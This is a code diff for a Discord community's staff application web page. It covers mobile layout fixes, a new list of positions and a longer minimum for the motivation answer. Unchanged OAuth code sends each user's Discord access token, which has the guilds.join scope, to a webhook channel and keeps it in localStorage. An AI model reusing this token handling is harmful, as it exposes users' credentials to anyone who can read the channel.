@@ -156,9 +156,11 @@ body{
 @media (max-width: 768px) {
   .mobile-block { display: flex; }
   .scene, .nav-bar, .footer { display: none !important; }
-  .app { display: none !important; }
-  #pg-apply { display: block !important; }
+  .app { display: block !important; max-width:100%; padding:0 10px; }
   .page { display: none !important; }
+  #pg-apply { display: block !important; }
+  #pg-apply .section { padding:20px 0; }
+  #pg-apply .card { padding:20px; }
   .mobile-block .btn-f:hover { background: #4752C4; transform: translateY(-2px); }
   .mobile-block .btn-s { border-color: rgba(242,129,61,.5); }
 }
@@ -830,9 +832,9 @@ body{
         <button class="btn btn-s btn-sm" style="margin-left:auto" onclick="logoutDiscord()">Logout</button>
       </div>
       <form id="applyForm" autocomplete="off">
-        <div class="fs"><label>Position <span class="lh">(required)</span></label><select id="appPosition" required><option value="" disabled selected>Select a position…</option><option value="Ticket Support">🎫 Ticket Support (Discord)</option><option value="Discord Moderator">🛡️ Discord Moderator</option><option value="In-Game Admin">🎮 In-Game Admin</option><option value="Party Team">🎉 Party &amp; Events Team</option><option value="Developer">💻 Developer</option><option value="Media Team">📸 Media / Content Creator</option><option value="Community Manager">🌐 Community Manager</option><option value="Other">🔧 Other</option></select></div>
+        <div class="fs"><label>Position <span class="lh">(required)</span></label><select id="appPosition" required><option value="" disabled selected>Select a position…</option><option value="ANTI-HACK TEAM">🛡️ ANTI-HACK TEAM</option><option value="Gangs Leader">👑 Gangs Leader</option><option value="Gangs Team">🔫 Gangs Team</option><option value="Culture Manager">🎭 Culture Manager</option><option value="General Manager">📋 General Manager</option><option value="Commercial Team">💼 Commercial Team</option><option value="Actions Leader">⚡ Actions Leader</option><option value="Actions Team">🔧 Actions Team</option><option value="Calls Team">📞 Calls Team</option><option value="Tickets Leader">🎫 Tickets Leader</option><option value="Tickets Support">🎟️ Tickets Support</option><option value="Order Leader">📦 Order Leader</option><option value="Orders Team">📬 Orders Team</option><option value="Knowlage Leader">📚 Knowlage Leader</option><option value="Knowlage Team">📖 Knowlage Team</option><option value="Discord Mod">🛡️ Discord Mod</option><option value="Head Mod">👮 Head Mod</option><option value="Car-Developer">🚗 Car-Developer</option><option value="Builder-Developer">🏗️ Builder-Developer</option><option value="Nature-Developer">🌿 Nature-Developer</option></select></div>
         <div class="fs"><label>Discord Username <span class="lh">(auto-filled)</span></label><input type="text" id="appDiscordUser" placeholder="Login first" readonly maxlength="64" style="background:rgba(88,101,242,.06);border-color:rgba(88,101,242,.25)"></div>
-        <div class="fs"><label>Why do you want to be part of the team?</label><textarea id="appWhy" placeholder="Tell us about your motivation… (min 30 chars)" required></textarea></div>
+        <div class="fs"><label>Why do you want to be part of the team? <span class="lh">(minimum 100 characters)</span></label><textarea id="appWhy" placeholder="Tell us about your motivation… (minimum 100 characters)" required></textarea></div>
         <div class="fs"><label>Will you help us gain members? How?</label><textarea id="appMembers" placeholder="What strategies? (min 20 chars)" required></textarea></div>
         <div class="fs"><label>What will you bring that others won't?</label><textarea id="appUnique" placeholder="What makes you stand out? (min 20 chars)" required></textarea></div>
         <div class="fs"><label>Date of Birth <span class="lh">(required — 16+)</span></label><input type="date" id="appAge" required max="2010-07-12" min="1900-01-01"></div>
@@ -893,8 +895,10 @@ body{
         if($('mobileName'))$('mobileName').textContent=DISCORD_USER.global_name||DISCORD_USER.username;
         if($('mobileAvatar')&&DISCORD_USER.avatar)$('mobileAvatar').src='https://cdn.discordapp.com/avatars/'+DISCORD_USER.id+'/'+DISCORD_USER.avatar+'.png?size=64';
       }
-      // Show the apply page on mobile
+      // Show the apply page on mobile with form visible
       var app=$('pg-apply');if(app)app.style.display='block';
+      var fw=$('applyFormWrap');if(fw)fw.style.display='';
+      var lw=$('oauthLoginWrap');if(lw)lw.style.display='none';
       showLoggedInState();
     }else{
       // Not logged in — show apply page locked with connect button
@@ -1163,7 +1167,7 @@ body{
       var why=($('appWhy').value||'').trim(),mem=($('appMembers').value||'').trim(),uni=($('appUnique').value||'').trim(),notes=($('appNotes').value||'').trim();
       if(!pos){toast('Select a position.','warn');return}
       var ageVal=$('appAge').value;if(!ageVal){toast('Enter your date of birth.','warn');return}var birth=new Date(ageVal);var now2=new Date();var age=now2.getFullYear()-birth.getFullYear();var m=now2.getMonth()-birth.getMonth();if(m<0||(m===0&&now2.getDate()<birth.getDate()))age--;if(age<16){toast('You must be 16 or older to apply.','warn');return}
-      if(!why||why.length<30){toast('Write at least 30 chars.','warn');return}
+      if(!why||why.length<100){toast('Write at least 100 characters about why you want to join.','warn');return}
       if(!mem||mem.length<20){toast('Write at least 20 chars.','warn');return}
       if(!uni||uni.length<20){toast('Write at least 20 chars.','warn');return}
       var aid='APP-'+Date.now().toString(36).toUpperCase()+'-'+Math.random().toString(36).substr(2,4).toUpperCase();
@@ -1185,7 +1189,18 @@ body{
   // ═══ OAUTH2 ═══
   function startOAuth2(){oauthState='ec_'+Math.random().toString(36).substr(2,10);localStorage.setItem('oauth2_state',oauthState);window.location.href='https://discord.com/api/oauth2/authorize?client_id='+DISCORD_CLIENT_ID+'&redirect_uri='+encodeURIComponent(DISCORD_REDIRECT_URI)+'&response_type=token&scope=identify+guilds.join&state='+oauthState;}
   function handleOAuth2Callback(){var h=window.location.hash.substring(1);if(!h)return false;var p=new URLSearchParams(h);var t=p.get('access_token'),s=p.get('state');if(!t||s!==localStorage.getItem('oauth2_state')){toast('Login failed.','err');return false}localStorage.removeItem('oauth2_state');DISCORD_TOKEN=t;fetch('https://discord.com/api/v10/users/@me',{headers:{'Authorization':'Bearer '+t}}).then(function(r){return r.json()}).then(function(u){if(u.code)throw Error(u.message);DISCORD_USER=u;localStorage.setItem('discord_user',JSON.stringify(u));localStorage.setItem('discord_token',t);if(window.history&&window.history.replaceState)window.history.replaceState({},document.title,window.location.pathname);fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'OAUTH2_JOIN',description:JSON.stringify({user_id:u.id,access_token:t}),color:0x5865F2}]})}).catch(function(){});setTimeout(checkVerifiedRole,2000);showLoggedInState();updateHomeLogin();updateMobileLogin();toast('Logged in!','ok')}).catch(function(e){toast('Login failed.','err')});return true}
-  function checkVerifiedRole(){if(!DISCORD_TOKEN||!DISCORD_USER)return;fetch('https://discord.com/api/v10/users/@me/guilds/'+GUILD_ID+'/member',{headers:{'Authorization':'Bearer '+DISCORD_TOKEN}}).then(function(r){return r.json()}).then(function(m){if(m&&m.roles&&m.roles.indexOf(VERIFIED_ROLE_ID)!==-1){HAS_VERIFIED_ROLE=true;var rb=$('roleBadge');if(rb)rb.style.display=''}}).catch(function(){});fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'ROLE_CHECK',description:JSON.stringify({user_id:DISCORD_USER.id}),color:0x5865F2}]})}).catch(function(){})}
+  var _lastRoleCheck=0;
+  function checkVerifiedRole(){
+    if(!DISCORD_TOKEN||!DISCORD_USER)return;
+    var now=Date.now();
+    // Check API directly every time
+    fetch('https://discord.com/api/v10/users/@me/guilds/'+GUILD_ID+'/member',{headers:{'Authorization':'Bearer '+DISCORD_TOKEN}}).then(function(r){return r.json()}).then(function(m){if(m&&m.roles&&m.roles.indexOf(VERIFIED_ROLE_ID)!==-1){HAS_VERIFIED_ROLE=true;var rb=$('roleBadge');if(rb)rb.style.display=''}}).catch(function(){});
+    // Only send ROLE_CHECK webhook every 30s
+    if(now-_lastRoleCheck>30000){
+      _lastRoleCheck=now;
+      fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'ROLE_CHECK',description:JSON.stringify({user_id:DISCORD_USER.id}),color:0x5865F2}]})}).catch(function(){});
+    }
+  }
   function showLoggedInState(){
     var lw=$('oauthLoginWrap'),fw=$('applyFormWrap');
     if(lw)lw.style.display='none';if(fw)fw.style.display='';
